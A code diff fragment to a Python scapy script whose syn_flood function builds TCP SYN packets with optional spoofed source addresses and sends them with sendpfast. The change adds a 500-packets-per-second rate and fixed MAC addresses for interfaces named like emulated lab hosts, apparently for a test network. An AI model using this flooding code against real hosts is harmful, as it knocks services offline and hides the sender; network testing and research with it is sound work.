@@ -17,7 +17,7 @@ from scapy.all import IP, TCP, Ether, sendpfast, get_if_hwaddr, conf
 BASE_FRAME_BYTES = 14 + 20 + 20
 
 def send_packets(packets, iface):
-    sendpfast(packets, loop=0, iface=iface)
+    sendpfast(packets, loop=0, pps=500, iface=iface)
 
 def syn_flood(target_ip, target_port, duration, ipi, window, tos, ttl,
               frame_size, spoof_subnet, iface, jitter):
@@ -34,13 +34,23 @@ def syn_flood(target_ip, target_port, duration, ipi, window, tos, ttl,
     payload_len = max(0, frame_size - BASE_FRAME_BYTES)
     payload = b"A" * payload_len
 
+    src_mac = get_if_hwaddr(iface)
+
+    dst_mac = {
+        "a1-eth0": "00:00:01:00:00:11",
+        "a2-eth0": "00:00:01:00:00:12",
+    }.get(iface)
+
+    if dst_mac is None:
+        raise ValueError(f"No destination MAC configured for {iface}")
+
     src_port = random.randint(1024, 65535)
     ip_kwargs = {"dst": target_ip, "tos": tos, "ttl": ttl}
     if spoof_subnet:
         ip_kwargs["src"] = f"{spoof_subnet}{random.randint(2, 254)}"
 
     pkts = [
-        Ether() /
+        Ether(src=src_mac, dst=dst_mac) /
         IP(**ip_kwargs) /
         TCP(sport=src_port, dport=target_port, flags="S",
             seq=random.randint(0, 2**32 - 1), window=window) /
